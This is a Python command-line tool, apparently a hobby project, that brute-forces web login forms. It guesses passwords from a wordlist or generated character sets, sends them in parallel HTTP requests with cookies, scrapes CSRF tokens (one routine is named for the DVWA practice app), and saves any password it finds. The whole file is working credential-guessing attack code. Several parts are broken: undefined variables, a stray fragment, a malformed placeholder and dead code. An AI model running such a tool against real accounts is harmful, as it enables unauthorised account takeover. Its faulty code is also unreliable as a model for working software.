#!/usr/bin/env python
import requests
import json
import optparse  # call option -p -h
import itertools  # to brtue force fast
import string
import os
import crypt
import pyfiglet  # font
from termcolor import cprint, colored
import time
import term  # py-term
from datetime import timedelta
import sys
import threading
import shutil  # copy file
import subprocess
from multiprocessing import Process, BoundedSemaphore, Queue, current_process, cpu_count


class Thuan_01():
    def __init__(self):
        self.start_time = time.monotonic()
        self.process_lock = BoundedSemaphore(value=cpu_count())
        self.counter_lock = threading.BoundedSemaphore(value=1)
        self.banner()
        self.stop = Queue(maxsize=1)
        self.stop.put(False)
        self.count = Queue(maxsize=1)
        self.threads = []
        self.name = Queue(maxsize=1)
        self.name.put(str("a"))
        self.process_count = 0
        self.limit_process = 500
        self.shot = 5000

    def fun(self, string):  # start cracking
        list = []
        fer = ['-', "\\", "|", '/']
        for char in string:
            list.append(char)
        timer = 0
        pointer = 0
        fer_pointer = 0
        while timer < 20:
            list[pointer] = list[pointer].upper()
            print("\r" + self.blue("".join(str(x) for x in list) + " " + fer[fer_pointer]), end="")
            list[pointer] = list[pointer].lower()
            max_fer = len(fer) - 1
            if fer_pointer == max_fer:
                fer_pointer = -1
            max = len(list) - 1
            if pointer == max:
                pointer = -1
            pointer += 1
            fer_pointer += 1
            timer += 1
            time.sleep(0.1)
            if timer == 20:
                print("\r" + self.blue(string) + "\n", end="")
                return

    def blue(self, string):
        return colored(string, "blue", attrs=['bold'])

    def green(self, string):
        return colored(string, "green", attrs=['bold'])

    def yellow(self, string):
        return colored(string, "yellow", attrs=['bold'])

    def red(self, string):
        return colored(string, "red", attrs=['bold'])

    def bwhite(self, string):
        return colored(string, "white", attrs=['bold'])

    def white(self, string):
        return colored(string, "white")
        if str(file).split(".")[-1] == "rar":
            return "rar"
        elif str(file).split(".")[-1] == "zip":
            return "zip"
        elif str(file).split(".")[-1] == "pdf":
            return "pdf"
        else:
            return "text"

    def count_word(self, dict_file):
        count = 0
        with open(dict_file, "r") as wordlist:
            for line in wordlist:
                count += 1
        return count

    def count_possible_com(self, chars, min, max):  # count possible case charset
        x = min
        possible_com = 0
        while x <= max:
            possible_com += len(chars) ** x
            x += 1
        return possible_com

    def counter(self, max_words):  # count percent cracking
        self.counter_lock.acquire()
        num = self.count.get()
        # print(self.count)
        # print(num)
        if num != 0:
            self.count.put(num - 1)
            current_word = max_words - int(num) + 1
            percent = (100 * current_word) / max_words
            width = (current_word + 1) / (max_words / 42)  # 100 / 25
            bar = "\t" + self.white("Progress : [") + "#" * int(width) + " " * (42 - int(width)) \
                  + "] " + self.yellow(str("%.3f" % percent) + " %")
            # time.sleep(1)
            sys.stdout.write(u"\t\u001b[1000D" + bar)
            sys.stdout.flush()
        self.counter_lock.release()

    def handling_too_many_open_files_error(self):
        if self.process_count == self.limit_process:
            for x in self.threads:
                x.join()
            self.threads = []
            self.limit_process += 500

    def delete_temporary_directory(self):
        if os.path.exists("temp_directory"):
            shutil.rmtree("temp_directory")

    def search_for_pass(self, passwords_list, username, link, data, fail, max_words):  # for dictionary and brute force
        try:
            # temp_file = self.create_temporary_copy(compress_file, passwords_list[1])
            for word in passwords_list:
                password = word.strip('\r').strip('\n')
                data0 = data.replace("^USER^", username)
                data00 = data0.replace("PASS^", password)
                # data1 = link + data00
                cookie1 = json.loads(cookie)
                # data1 = {"chkSubmit": "ok", "txtLoginId": username, "txtPassword": password, "txtSel": 1}
                r
                if len(token) > 1:
                    rq = requests.get(data00, cookies=cookie1)
                    content = rq.text
                    tk = content.find(token)
                    tk_value = "&" + token + "=" + content[(tk + len(token) + 9):(tk + len(token) + 9 + 32)] + "#"
                    data11 = link.replace("#", tk_value)
                    # value='32-chars'
                    r = requests.get(data11, cookies=cookie1)
                else:
                    r = requests.get(data00, cookies=cookie1)
                stop = self.stop.get()
                self.stop.put(stop)
                if stop is False:  # if find password dont doing more is false
                    self.counter(max_words)
                    if fail in r.text:
                        with open("tries.txt", "a") as f:
                            f.write(f"{password}\n")
                            f.close()
                        # print(f"Incorrect password {passwd}\n")
                    else:
                        self.stop.get()
                        self.stop.put(True)
                        time.sleep(3)
                        print("\n\t" + self.green("[+] Password Found: " + password + '\n'))
                        # correctpwd = True
                        # print(f"Correct password {passwd}!\n")
                        with open("correct_pass.txt", "w") as f:
                            f.write(password)
                        break

                else:
                    break
                # if os.path.isfile(temp_file):
                # os.remove(os.path.abspath(temp_file))
                # last_process_number = int(max_words / 500) + (max_words % 500 > 0)
            if str(self.last_process_number) in str(current_process().name):
                time.sleep(20)
                stop = self.stop.get()
                self.stop.put(stop)
                if stop is False:
                    print("\n\t" + self.red("[-] password not found") + "\n")
                else:
                    pass
            self.process_lock.release()
        except KeyboardInterrupt:
            self.process_lock.release()

    def search_for_pass_dvwa(self, passwords_list, username, link, token, data, cookie, fail, max_words):
        try:
            # temp_file = self.create_temporary_copy(compress_file, passwords_list[1])
            for word in passwords_list:
                password = word.strip('\r').strip('\n')
                data0 = link.replace("^USER^", username)
                data00 = data0.replace("^PASS^", password)
                # data1 = link + data00
                cookie1 = json.loads(cookie)
                # data1 = {"chkSubmit": "ok", "txtLoginId": username, "txtPassword": password, "txtSel": 1}
                if len(token) > 1:
                    rq = requests.get(data00, cookies=cookie1)
                    content = rq.text
                    tk = content.find(token)
                    tk_value = "&" + token + "=" + content[(tk + len(token) + 9):(tk + len(token) + 9 + 32)] + "#"
                    data11 = data00.replace("#", tk_value)
                    # value='32-chars'
                    r = requests.get(data11, cookies=cookie1)
                    stop = self.stop.get()
                    self.stop.put(stop)
                    if stop is False:  # if find password dont doing more is false
                        self.counter(max_words)
                        if fail in r.text:
                            with open("tries.txt", "a") as f:
                                f.write(f"{password}\n")
                                f.close()
                            # print(f"Incorrect password {passwd}\n")
                        else:
                            self.stop.get()
                            self.stop.put(True)
                            time.sleep(3)
                            print("\n\t" + self.green("[+] Password Found: " + password + '\n'))
                            with open("correct_pass.txt", "w") as f:
                                f.write(password)
                            break

                    else:
                        break
                else:
                    r = requests.get(data00, cookies=cookie1)
                    stop = self.stop.get()
                    self.stop.put(stop)
                    if stop is False:  # if find password dont doing more is false
                        self.counter(max_words)
                        if fail in r.text:
                            with open("tries.txt", "a") as f:
                                f.write(f"{password}\n")
                                f.close()
                            # print(f"Incorrect password {passwd}\n")
                        else:
                            self.stop.get()
                            self.stop.put(True)
                            time.sleep(3)
                            print("\n\t" + self.green("[+] Password Found: " + password + '\n'))
                            with open("correct_pass.txt", "w") as f:
                                f.write(password)
                            break

                    else:
                        break
            if str(self.last_process_number) in str(current_process().name):
                time.sleep(20)
                stop = self.stop.get()
                self.stop.put(stop)
                if stop is False:
                    print("\n\t" + self.red("[-] password not found") + "\n")
                else:
                    pass
            self.process_lock.release()
        except KeyboardInterrupt:
            self.process_lock.release()
        
    def last_words_check(self, max_words, passwords_list, username, link, data, fail):
        while True:
            if self.stop is True:
                exit(0)
            elif self.count == len(passwords_list):  # self_cont kam mishe
                if self.file_type is "rar":
                    self.search_for_pass(passwords_list, username, link, data, fail, max_words)
                if self.stop is False:
                    print("\n\t" + self.red("[-] Password not found") + "\n")
                    self.delete_temporary_directory()
                    self.end_time()
                return
            else:
                pass

    def dict_guess_password(self, dict_file, username, link, data, fail):
        last_check = 0
        passwords_group = []
        possible_words = self.count_word(dict_file)
        self.last_process_number = int(possible_words / self.shot) + (possible_words % self.shot > 0)
        self.count.put(possible_words)
        # self.file_type = self.detect_file_type(file)
        self.fun("Starting password cracking " + link)
        print(
            "\n " + self.blue("[*]") + self.white(" Count of possible passwords: ") + self.bwhite(str(possible_words)))
        with open(dict_file, "r") as wordlist:
            for word in wordlist:
                passwords_group.append(word)
                last_check += 1
                self.handling_too_many_open_files_error()
                if (len(passwords_group) == self.shot) or (possible_words - last_check == 0):
                    passwords = passwords_group
                    passwords_group = []
                    self.process_lock.acquire()
                    stop = self.stop.get()
                    self.stop.put(stop)
                    if stop is False:  # ok finishing all process after finding password
                        t = Process(target=self.search_for_pass,
                                    args=(passwords, username, link, data, fail, possible_words))
                        self.threads.append(t)
                        self.process_count += 1
                        t.start()
                    else:
                        self.process_lock.release()
                else:
                    continue
            for x in self.threads:
                x.join()
            self.delete_temporary_directory()
            self.end_time()

    def dict_guess_password_dvwa(self, dict_file, username, link, token, data, cookie, fail):
        last_check = 0
        passwords_group = []
        possible_words = self.count_word(dict_file)
        self.last_process_number = int(possible_words / self.shot) + (possible_words % self.shot > 0)
        self.count.put(possible_words)
        # self.file_type = self.detect_file_type(file)
        self.fun("Starting password cracking " + link)
        print(
            "\n " + self.blue("[*]") + self.white(" Count of possible passwords: ") + self.bwhite(str(possible_words)))
        with open(dict_file, "r") as wordlist:
            for word in wordlist:
                passwords_group.append(word)
                last_check += 1
                self.handling_too_many_open_files_error()
                if (len(passwords_group) == self.shot) or (possible_words - last_check == 0):
                    passwords = passwords_group
                    passwords_group = []
                    self.process_lock.acquire()
                    stop = self.stop.get()
                    self.stop.put(stop)
                    if stop is False:  # ok finishing all process after finding password
                        t = Process(target=self.search_for_pass_dvwa,
                                    args=(passwords, username, link, token, data, cookie, fail, possible_words))
                        self.threads.append(t)
                        self.process_count += 1
                        t.start()
                    else:
                        self.process_lock.release()
                else:
                    continue
            for x in self.threads:
                x.join()
            self.delete_temporary_directory()
            self.end_time()

    def bruteforce_guess_password(self, chars, min, max, username, link, data, fail):
        last_check = 0
        passwords_group = []
        possible_com = self.count_possible_com(chars, int(min), int(max))
        self.last_process_number = int(possible_com / self.shot) + (possible_com % self.shot > 0)
        self.count.put(possible_com)
        # self.file_type = self.detect_file_type(file)
        self.fun("Starting password cracking for " + link)
        print("\n " + self.blue("[*]") + self.white(" Count of possible passwords: ") + self.bwhite(str(possible_com)))
        for password_length in range(int(min), int(max) + 1):
            for guess in itertools.product(chars, repeat=password_length):
                guess = ''.join(guess)
                passwords_group.append(guess)
                last_check += 1
                self.handling_too_many_open_files_error()
                if (len(passwords_group) == self.shot) or (possible_com - last_check == 0):
                    passwords = passwords_group
                    passwords_group = []
                    self.process_lock.acquire()
                    stop = self.stop.get()
                    self.stop.put(stop)
                    if stop is False:  # ok finishing all process after finding password
                        t = Process(target=self.search_for_pass,
                                    args=(passwords, username, link, data, fail, possible_com))
                        self.threads.append(t)
                        self.process_count += 1
                        t.start()
                    else:
                        self.process_lock.release()
                else:
                    continue
        for x in self.threads:
            x.join()
        self.delete_temporary_directory()
        self.end_time()

    def make_chars(self, char_type):
        chartype_list = char_type.split(",")
        chars = ""
        for chartype in chartype_list:
            if chartype == "lowercase":
                chars += string.ascii_lowercase
            elif chartype == "uppercase":
                chars += string.ascii_uppercase
            elif chartype == "letters":
                chars += string.ascii_letters
            elif chartype == "digits":
                chars += string.digits
            elif chartype == "symbols":
                chars += string.punctuation
            elif chartype == "space":
                chars += " "
            else:
                return False
        return chars

    def banner(self):
        term.clear()
        term.pos(1, 1)
        # check if font "epic" exists on this system
        # sudo wget http://www.figlet.org/fonts/epic.flf -O /usr/share/figlet/epic.flf
        bannerfont = "epic" if os.path.exists('/usr/share/figlet/epic.flf') else "banner"
        banner = pyfiglet.figlet_format("THUAN", font=bannerfont).replace("\n", "\n\t\t", 7)

        cprint("\r\n\t" + "@" * 61, "blue", end="")
        cprint("\n\t\t" + banner + "\t\tAuthor : Thuan Nguyen", "yellow", attrs=['bold'])
        cprint("\t" + "@" * 61 + "\n", "blue")

    def end_time(self):
        self.stop = True
        end_time_show = time.asctime()
        end_time = time.monotonic()
        execution_time = (timedelta(seconds=end_time - self.start_time))
        print(self.blue("End time ==> ") + self.white(end_time_show))
        print(self.blue("Execution time ==> ") + self.white(str(execution_time)) + "\n")
        term.saveCursor()
        term.pos(7, 15)
        term.writeLine("ok", term.green, term.blink)
        term.restoreCursor()
        exit(0)

    def main(self):
        start_time_show = time.asctime()
        usage = "%prog [options] [args]" \
                "\n\nDictionary Mode:" \
                "\n   %prog -f <file> -d <wordlist>" \
                "\n\nBrute force Mode:" \
                "\n   %prog -f <file> -b <char_type> -m <min_length> -x <max_length>" \
                "\n\n   Available char_type:" \
                "\n\t<lowercase>  The lowercase letters abcdefghijklmnopqrstuvwxyz" \
                "\n\t<uppercase>  The uppercase letters ABCDEFGHIJKLMNOPQRSTUVWXYZ" \
                "\n\t<letters>    The concatenation of the lowercase and uppercase" \
                "\n\t<digits>     numbers 0123456789" \
                "\n\t<symbols>    punctuation characters !#$%&'()*+,-./:;<=>?@[\]^_`{|}~'" + '"' \
                                                                                             "\n\t<space>      space character" \
                                                                                             "\n   You can select multiple character types." \
                                                                                             "\n\tExample: %prog -f <file> -b <space,digits> -m 1 -x 8"

        parser = optparse.OptionParser(usage)
        parser.add_option("-d", dest="dictfile", type='string', help="Specifies dictionary file")
        # parser.add_option("-f", dest="file", type='string', help="Specifies the file")
        parser.add_option("-l", dest="link", type='string', help="Specifies the link")
        parser.add_option("-e", dest="data", type='string', help="Specifies the data")
        parser.add_option("-f", dest="fail", type='string', help="Specifies the fault")
        parser.add_option("-u", dest="username", type='string', help="Specifies the username")
        parser.add_option("-g", dest="get", type='string', help="Specifies the get method")
        parser.add_option("-p", dest="post", type='string', help="Specifies the post method")
        parser.add_option("-c", dest="cookie", type='string', help="Specifies the cookies")
        parser.add_option("-s", dest="success", type='string', help="Specifies the success")
        parser.add_option("-t", dest="token", type='string', help="Specifies the user token")
        parser.add_option("-b", dest="chartype", type='string', help="Specifies the character type")
        parser.add_option("-m", dest="minlength", type='string', help="Specifies minimum length of password")
        parser.add_option("-x", dest="maxlength", type='string', help="Specifies maximum length of password")

        (options, args) = parser.parse_args()
        try:
            if options.post:
                # link = os.path.abspath(options.file)
                if options.dictfile:
                    if os.path.isfile(options.dictfile):
                        dictfile = os.path.abspath(options.dictfile)
                        print(self.blue("Start time ==> ") + self.white(start_time_show) + "\n")
                        self.dict_guess_password(dictfile, options.username, options.link, options.data, options.fail)
                    else:
                        parser.error(" " + options.dictfile + " dictionary file does not exist")
                        exit(0)
                elif options.chartype:
                    chars = self.make_chars(options.chartype)
                    if chars is False:
                        parser.error(" " + options.chartype + " character type is not valid, Use --help for more info")
                    if options.minlength is None:
                        parser.error(" Enter minimum length of password")
                        exit(0)
                    if options.maxlength is None:
                        parser.error(" Enter maximum length of password")
                        exit(0)
                    if options.minlength > options.maxlength:
                        parser.error(" Min and Max must be numbers and Min must be \nless than Max or be the same"
                                     ", Use --help for more info")
                        exit(0)
                    else:
                        print(self.blue("Start time ==> ") + self.white(start_time_show) + "\n")
                        self.bruteforce_guess_password(chars, options.minlength, options.maxlength, options.username,
                                                       options.link, options.data, options.fail)

                else:
                    parser.error(" Choose a wordlist or bruteforce method, Use --help for more info")
                    exit(0)
            elif options.get:
                if options.dictfile:
                    if os.path.isfile(options.dictfile):
                        dictfile = os.path.abspath(options.dictfile)
                        print(self.blue("Start time ==> ") + self.white(start_time_show) + "\n")
                        self.dict_guess_password_dvwa(dictfile, options.username, options.link, options.token,
                                                      options.data, options.cookie, options.fail)
                    else:
                        parser.error(" " + options.dictfile + " dictionary file does not exist")
                        exit(0)

            else:
                parser.error(" Choose a link, Use --help for more info")
                exit(0)

        except KeyboardInterrupt:
            time.sleep(1)
            self.delete_temporary_directory()
            print(self.red("\n\n [-] Detected CTRL+C") + self.white("\n closing app...\n Finish\n"))
            # self.end_time()
            exit(0)


if __name__ == "__main__":
    cracker = Thuan_01()
    cracker.main()
